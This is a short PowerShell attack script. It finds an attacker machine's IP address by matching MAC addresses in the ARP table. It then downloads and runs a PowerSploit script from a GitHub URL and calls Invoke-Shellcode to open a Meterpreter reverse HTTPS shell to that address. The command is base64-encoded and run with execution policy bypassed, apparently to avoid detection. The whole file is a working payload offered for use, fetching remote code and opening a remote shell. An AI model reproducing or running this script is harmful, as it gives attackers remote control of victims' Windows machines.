# Automatically find IP Addresses From Mac Address
$Computer = "24:77:03:22:09:60"
$Tablet = "00:1A:99:D4:F3:43"
try {
    $DevIP = arp -a | select-string "$Computer" |% { $_.ToString().Trim().Split(" ")[0] }
    }
catch {
    try {
        $DevIP = arp -a | select-string "$Tablet" |% { $_.ToString().Trim().Split(" ")[0] }
        }
    catch {
        EXIT
        }
    }
$url = '"https://github.com/Burnd9671/HID-Powersploit/raw/master/var/www/html/Invoke-Powersploit"'
$rawcmd = "iex (New-Object Net.WebClient).DownloadString($url); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $DevIP -Lport 8443 -Force"
Echo $rawcmd > "C:\Users\Bryan Louiselle\Desktop\Raw_Command.txt"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($rawcmd)
$obfscmd = [Convert]::ToBase64String($bytes)
Powershell -Exec Bypass -Nol -Enc $obfscmd
